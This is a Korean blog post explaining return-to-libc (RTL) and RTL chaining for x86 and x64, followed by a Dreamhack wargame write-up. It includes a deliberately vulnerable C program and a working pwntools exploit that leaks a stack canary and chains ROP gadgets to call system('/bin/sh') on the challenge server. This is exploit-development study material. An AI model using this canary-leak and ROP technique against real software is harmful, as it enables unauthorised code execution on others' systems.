---
tistoryBlogName: k0n9
tistoryTitle: RTL
tistoryVisibility: "0"
tistoryCategory: "0"
tistorySkipModal: true
tistoryPostId: "22"
tistoryPostUrl: https://k0n9.tistory.com/22
---
## RTL이란?

Return To Library,

기존의 rts는 스택에 shellcode를 넣고 ret변조를 통해 셸을 실행시켰다. 하지만 Nx-bit 보호기법으로 스택에서 코드가 실행되지 않는다. 이를 우회하는 것이 RTL로 RET에 Library에 있는 함수의 주소를 넣어서 실행흐름을 변경한다.

### 공격순서(0x86 기준)

1. ret에 system함수의 주소를 넣는다.
    
2. 그 후에는 system함수 이후 실행할 주소의 공간이니 아무 값으로 채운다,
    
3. system 함수의 인자값을 입력한다.

## RTL chaining

가젯을 이용하여 이전의 인자들을 정리하고 ret부분에 다시 특정 함수를 호출한다. 그렇게 연속적으로 함수를 호출하는게 RTL chaining기법이다.

### x86

x86에서의 rtl chaining은 우선 가젯을 아무거나 사용해도 된다. 어짜피 인자를 스택에 넣기 때문에 아무 가젯이나 사용한다.

## 공격순서

1. ret : 실행 함수
2. 가젯
3. 인자   
4. 실행 함수
5. 가젯   
6. 인자
7. ...


### x64

**x64에서는 6개까지 인자를 레지스터에 저장한다.**

**rdi, rsi, rdx. rcx. r8. r9**

순서대로 인자를 넣기 때문에 그에 해당하는 가젯을 찾아야 한다. 64비트는 레지스터에 인자가 있어야 하기 때문에 exploit순서가 x86과 다르다.

## 공격순서

1. ret : 가젯   
2. 인자
3. 실행할 함수   
4. 가젯
5. 인자   
6. 실행할 함수
7. …


## 예제 __ dreamhack

```C
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie
  
#include <stdio.h>
#include <unistd.h>
  
const char* binsh = "/bin/sh";
  
int main() {
  char buf[0x30];
  
  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);
  
  // Add system function to plt's entry
  system("echo 'system@plt");
  
  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);
  
  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  
  return 0;
}
```
c코드는 다음과 같다.

![](https://i.imgur.com/eLNd7Ka.png)

보호기법은 다음과 같다.
공격 방법은 이렇다.

1. 처음 입력에서 카나리의 null바이트를 덮어 카나리 릭을 한다.
2. 두 번째 입력에서 buf + canary + sfp + ret(stack alignment) + pop_rdi_gadget + binsh_add + system_add 로 익스플로잇을 한다.

익스코드는 다음과 같다.
```python
from pwn import *
  
# context.log_level = 'debug'
  
e = ELF("./rtl")
p = remote("host3.dreamhack.games", 16982)
# p = process("./rtl")
  
system = 0x4005d0
pop_rdi = 0x400853
ret_g = 0x400854
binsh = next(e.search(b"/bin/sh\x00"))
  
ca = b'a'*0x38 + b'b'
p.sendafter(b"Buf: ", ca)
p.recvuntil(b"ab")
canary = u64(b"\x00"+p.recv(7))
  
# pause()
  
ex = b'a'*0x38
ex += p64(canary)
ex += b'a'*0x8
ex += p64(ret_g)
ex += p64(pop_rdi)
ex += p64(binsh)
ex += p64(system)
  
p.sendafter(b"Buf: ", ex)
  
p.interactive()
```

![](https://i.imgur.com/XjDSMbg.png)

셸을 땄다.